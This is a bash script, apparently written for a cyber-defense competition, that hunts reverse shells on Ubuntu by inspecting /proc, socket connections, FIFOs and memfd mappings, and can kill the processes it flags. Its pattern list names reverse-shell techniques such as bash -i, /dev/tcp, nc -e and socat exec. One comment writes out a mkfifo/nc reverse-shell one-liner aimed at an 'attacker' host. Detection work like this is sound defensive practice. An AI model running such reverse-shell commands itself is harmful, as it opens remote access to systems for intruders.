#!/usr/bin/env bash
# =============================================================================
# stop-revshells.sh — Nine-Tailed Fox CDT Competition
# Hunts and kills reverse shells on Ubuntu 24.04
# Usage: ./stop-revshells.sh [-k] [-v] [-w <whitelist_ip_file>]
#   -k  actually kill detected processes (default: report only)
#   -v  verbose output
#   -w  file containing whitelisted IPs (one per line)
# =============================================================================

set -uo pipefail

KILL=0
VERBOSE=0
WHITELIST_FILE=""
FOUND=()
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG="$SCRIPT_DIR/revshell_$(hostname)_$(date +%Y%m%d_%H%M%S).log"

# --- arg parsing ---
while getopts "kvw:" opt; do
    case $opt in
        k) KILL=1 ;;
        v) VERBOSE=1 ;;
        w) WHITELIST_FILE="$OPTARG" ;;
        *) echo "Usage: $0 [-k] [-v] [-w whitelist_file]" >&2; exit 1 ;;
    esac
done

# --- helpers ---
log()  { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"; }
hit()  { echo "[$(date +%H:%M:%S)] [HIT]  $*" | tee -a "$LOG"; }
verb() { [[ $VERBOSE -eq 1 ]] && echo "[$(date +%H:%M:%S)] [DBG]  $*" | tee -a "$LOG" || true; }

if [[ $EUID -ne 0 ]]; then
    echo "Run as root" >&2
    exit 1
fi

# --- load whitelist ---
declare -A WHITELIST
if [[ -n "$WHITELIST_FILE" && -f "$WHITELIST_FILE" ]]; then
    while IFS= read -r ip; do
        [[ -z "$ip" || "$ip" == \#* ]] && continue
        WHITELIST["$ip"]=1
        verb "Whitelisted: $ip"
    done < "$WHITELIST_FILE"
fi

is_whitelisted() {
    local ip="$1"
    [[ -n "${WHITELIST[$ip]+_}" ]]
}

# --- kill or report ---
handle_hit() {
    local pid="$1"
    local reason="$2"
    local cmdline
    cmdline="$(tr '\0' ' ' < /proc/"$pid"/cmdline 2>/dev/null || echo '<unreadable>')"
    local user
    user="$(stat -c '%U' /proc/"$pid" 2>/dev/null || echo '?')"
    local ppid
    ppid="$(awk '/PPid/{print $2}' /proc/"$pid"/status 2>/dev/null || echo '?')"
    local parent_cmd
    parent_cmd="$(tr '\0' ' ' < /proc/"$ppid"/cmdline 2>/dev/null || echo '<unreadable>')"

    hit "PID=$pid USER=$user PPID=$ppid ($parent_cmd)"
    hit "  Reason : $reason"
    hit "  Cmdline: $cmdline"

    # log open fds for forensics
    ls -la /proc/"$pid"/fd 2>/dev/null | tee -a "$LOG" || true

    # track unique PIDs
    if [[ ! " ${FOUND[*]} " =~ " ${pid} " ]]; then
        FOUND+=("$pid")
    fi

    if [[ $KILL -eq 1 ]]; then
        hit "  Action : KILLING PID $pid"
        kill -9 "$pid" 2>/dev/null && hit "  Result : killed" || hit "  Result : kill failed (already dead?)"
    else
        hit "  Action : DRY RUN — re-run with -k to kill"
    fi
}

# =============================================================================
# DETECTION 1: stdin/stdout/stderr all pointing to the same socket
# Classic bash -i >& /dev/tcp/... and nc/socat revshells
# =============================================================================
log "=== [1] fd 0/1/2 → same socket (stdio redirect to socket) ==="

for pid_dir in /proc/[0-9]*/; do
    pid="${pid_dir//[^0-9]/}"
    [[ -d /proc/$pid/fd ]] || continue

    fd0="$(readlink /proc/$pid/fd/0 2>/dev/null || true)"
    fd1="$(readlink /proc/$pid/fd/1 2>/dev/null || true)"
    fd2="$(readlink /proc/$pid/fd/2 2>/dev/null || true)"

    # all three must exist, be sockets, and be the same socket inode
    [[ "$fd0" == socket:* && "$fd1" == socket:* && "$fd2" == socket:* ]] || continue
    [[ "$fd0" == "$fd1" && "$fd1" == "$fd2" ]] || continue

    # get the binary name
    exe="$(readlink /proc/$pid/exe 2>/dev/null || echo '<unknown>')"
    verb "PID $pid — all stdio → $fd0 — exe: $exe"

    # only flag shells and interpreters, not sshd/tmux/screen which legitimately do this
    case "$exe" in
        */bash|*/sh|*/dash|*/zsh|*/fish|\
        */python*|*/python|*/perl|*/ruby|\
        */nc|*/ncat|*/netcat|*/nmap|\
        */socat|*/php|*/lua*)
            handle_hit "$pid" "stdio (fd0/1/2) all redirected to same socket: $fd0 — exe: $exe"
            ;;
        *)
            verb "  skipping $exe (not a shell/interpreter)"
            ;;
    esac
done

# =============================================================================
# DETECTION 2: cmdline pattern matching
# Catches bash -i, /dev/tcp, mkfifo pipes, python/perl one-liners, etc.
# =============================================================================
log "=== [2] cmdline reverse shell patterns ==="

# patterns to match against the full cmdline string
declare -a PATTERNS=(
    "bash -i"
    "bash -c.*>&"
    "/dev/tcp/"
    "/dev/udp/"
    "sh -i"
    "0>&1"
    ">&2"
    "exec.*&[0-9]"
    "nc -e"
    "nc -c"
    "ncat -e"
    "ncat -c"
    "ncat.*--sh-exec"
    "ncat.*--exec"
    "netcat -e"
    "netcat -c"
    "socat.*exec"
    "socat.*pty"
    "socat.*EXEC"
    "mkfifo.*nc"
    "mkfifo.*bash"
    "python.*socket.*exec"
    "python.*import socket"
    "python.*subprocess.*socket"
    "perl.*socket"
    "perl -e.*fork"
    "ruby -rsocket"
    "lua.*socket"
    "php -r.*fsockopen"
    "php.*popen"
    "awk.*\"/inet/"
    "openssl.*s_client"
    "msfconsole"
    "meterpreter"
)

for pid_dir in /proc/[0-9]*/; do
    pid="${pid_dir//[^0-9]/}"
    [[ -f /proc/$pid/cmdline ]] || continue
    cmdline="$(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null || true)"
    [[ -z "$cmdline" ]] && continue

    for pattern in "${PATTERNS[@]}"; do
        if echo "$cmdline" | grep -qiE "$pattern"; then
            handle_hit "$pid" "cmdline matched pattern: '$pattern'"
            break
        fi
    done
done

# =============================================================================
# DETECTION 3: outbound established connections from shell/interpreter processes
# Catches revshells that didn't redirect stdio but use socket objects directly
# =============================================================================
log "=== [3] shell/interpreter processes with outbound ESTABLISHED connections ==="

# shells and interpreters we care about
SHELL_BINS="bash|sh|dash|zsh|fish|python[0-9.]*|python|perl|ruby|nc|ncat|netcat|socat|php|lua"

# build map: inode -> pid
declare -A INODE_TO_PID
for pid_dir in /proc/[0-9]*/; do
    pid="${pid_dir//[^0-9]/}"
    [[ -d /proc/$pid/fd ]] || continue
    for fd in /proc/$pid/fd/*; do
        link="$(readlink "$fd" 2>/dev/null || true)"
        if [[ "$link" == socket:[* ]]; then
            inode="${link//[^0-9]/}"
            INODE_TO_PID["$inode"]="$pid"
        fi
    done
done

# iterate established TCP connections
while IFS= read -r line; do
    # ss output: Netid State  Recv-Q Send-Q Local:Port Peer:Port Process
    [[ "$line" == *ESTAB* ]] || continue

    peer_addr="$(echo "$line" | awk '{print $6}')"
    peer_ip="${peer_addr%:*}"
    peer_port="${peer_addr##*:}"

    # skip whitelisted IPs
    if is_whitelisted "$peer_ip"; then
        verb "Skipping whitelisted peer $peer_ip"
        continue
    fi

    # skip loopback
    [[ "$peer_ip" == "127."* || "$peer_ip" == "::1" ]] && continue

    # get inode from ss -p
    inode="$(echo "$line" | grep -oP 'fd=\d+,ino=\K\d+' || true)"
    [[ -z "$inode" ]] && continue

    pid="${INODE_TO_PID[$inode]:-}"
    [[ -z "$pid" ]] && continue

    exe="$(readlink /proc/$pid/exe 2>/dev/null || true)"
    exe_base="$(basename "$exe" 2>/dev/null || true)"

    if echo "$exe_base" | grep -qE "^($SHELL_BINS)$"; then
        handle_hit "$pid" "shell/interpreter ($exe_base) has ESTABLISHED outbound connection to $peer_ip:$peer_port"
    fi
done < <(ss -tnpu 2>/dev/null)

# =============================================================================
# DETECTION 4: web server child processes with network connections
# Catches webshell-spawned revshells (www-data, apache, nobody)
# =============================================================================
log "=== [4] suspicious web-server-owned processes with outbound connections ==="

WEB_USERS="www-data|apache|apache2|nginx|http|nobody"

for pid_dir in /proc/[0-9]*/; do
    pid="${pid_dir//[^0-9]/}"
    [[ -f /proc/$pid/status ]] || continue

    owner="$(stat -c '%U' /proc/$pid 2>/dev/null || true)"
    echo "$owner" | grep -qE "^($WEB_USERS)$" || continue

    exe="$(readlink /proc/$pid/exe 2>/dev/null || true)"
    exe_base="$(basename "$exe" 2>/dev/null || true)"

    # web server process running a shell or interpreter? suspicious.
    echo "$exe_base" | grep -qE "^($SHELL_BINS)$" || continue

    # check if it has any outbound established connections
    has_conn=0
    for fd in /proc/$pid/fd/*; do
        link="$(readlink "$fd" 2>/dev/null || true)"
        [[ "$link" == socket:* ]] || continue
        inode="${link//[^0-9]/}"
        # check ss for this inode
        if ss -tnp 2>/dev/null | grep -q "ino=$inode"; then
            has_conn=1
            break
        fi
    done

    if [[ $has_conn -eq 1 ]]; then
        handle_hit "$pid" "web-user ($owner) running $exe_base with active socket — possible webshell revshell"
    fi
done

# =============================================================================
# DETECTION 5: named pipe (FIFO) + nc pattern
# mkfifo /tmp/x; nc attacker 4444 < /tmp/x | /bin/bash > /tmp/x
# =============================================================================
log "=== [5] processes reading from named pipes (FIFO revshell pattern) ==="

# find all FIFOs in /tmp /dev/shm /var/tmp
while IFS= read -r fifo; do
    verb "Found FIFO: $fifo"
    # find pids that have this FIFO open
    for pid_dir in /proc/[0-9]*/; do
        pid="${pid_dir//[^0-9]/}"
        [[ -d /proc/$pid/fd ]] || continue
        for fd in /proc/$pid/fd/*; do
            link="$(readlink "$fd" 2>/dev/null || true)"
            if [[ "$link" == "$fifo" ]]; then
                exe="$(readlink /proc/$pid/exe 2>/dev/null || echo '<unknown>')"
                handle_hit "$pid" "process has FIFO open: $fifo (likely mkfifo revshell) — exe: $exe"
                break
            fi
        done
    done
done < <(find /tmp /dev/shm /var/tmp -type p 2>/dev/null)

# =============================================================================
# DETECTION 6: deleted/anonymous executable mappings
# Fileless/memfd revshell loaders
# =============================================================================
log "=== [6] processes executing from deleted or anonymous memory (fileless) ==="

for pid_dir in /proc/[0-9]*/; do
    pid="${pid_dir//[^0-9]/}"
    [[ -f /proc/$pid/maps ]] || continue

    # check exe for (deleted) tag
    exe_link="$(readlink /proc/$pid/exe 2>/dev/null || true)"
    if [[ "$exe_link" == *"(deleted)"* ]]; then
        handle_hit "$pid" "running from deleted binary: $exe_link"
        continue
    fi

    # check maps for memfd or anonymous exec regions
    if grep -qE "^[0-9a-f]+-[0-9a-f]+ r-xp.*(memfd:|/dev/shm|/tmp)" /proc/$pid/maps 2>/dev/null; then
        region="$(grep -E "memfd:|/dev/shm|/tmp" /proc/$pid/maps 2>/dev/null | head -3)"
        handle_hit "$pid" "executable anonymous/memfd mapping:\n$region"
    fi
done

# =============================================================================
# SUMMARY
# =============================================================================
log ""
log "=== Summary ==="
log "Total suspicious processes found: ${#FOUND[@]}"

if [[ ${#FOUND[@]} -gt 0 ]]; then
    log "PIDs: ${FOUND[*]}"
    if [[ $KILL -eq 0 ]]; then
        log "Dry run — re-run with -k to kill all of the above"
    else
        log "All detected processes have been killed"
    fi
else
    log "No reverse shells detected"
fi

log "Full log: $LOG"
